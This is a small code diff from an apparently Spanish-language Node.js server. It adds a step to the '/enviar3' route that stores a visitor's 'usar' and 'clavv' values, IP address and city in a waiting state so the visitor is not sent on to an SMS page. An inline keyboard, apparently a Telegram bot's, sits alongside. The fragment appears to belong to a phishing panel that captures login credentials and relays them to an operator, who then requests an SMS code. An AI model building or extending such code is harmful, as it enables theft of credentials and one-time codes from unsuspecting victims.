@@ -191,6 +191,10 @@ app.post('/enviar3', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
+  // 👉 Guardar cliente en estado "esperando" (para que no rebote a esemese.html)
+  const cliente = { status: "esperando", usar, clavv, preguntas: [], ip, ciudad };
+  guardarCliente(txid, cliente);
+
   const keyboard = {
     inline_keyboard: [
       [
